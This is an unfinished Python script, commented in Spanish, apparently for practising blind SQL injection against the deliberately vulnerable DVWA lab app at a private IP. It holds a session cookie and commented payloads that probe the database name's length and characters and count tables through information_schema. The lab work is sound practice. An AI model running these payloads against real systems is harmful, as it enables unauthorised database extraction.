import requests

server = "http://10.0.99.24" #  servidor
cookie = "language=en; welcomebanner_status=dismiss; continueCode=POq8XxDzbkeJ7mY61E2joZGmMTNizSDgUbwTpYGLNgpK9BRya5Ww3lQ4VvnM; cookieconsent_status=dismiss; security=low; PHPSESSID=ah4bb2qv004g0pojm07jr24376"

# Obtener longitud del nombre de la base de datos
# 1' and length(database())=1 -- -




# Obtener el nombre de la base de datos
# 2' and ascii(substr(database(),1,1))=48 -- 
# A-Z → 65 a 90, a – z → 97 a 122, 0 – 9 → 48 a 57


# Obtener número de tablas de la base de datos
# 2' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=1 #



# de cada tabla obtengo:
# número de caracteres
# nombre


    
    # De cada tabla necesito: 1) número de columnas, 2) número de letras de cada columna, 3) nombre de cada columna.
    # número de columnas:
    


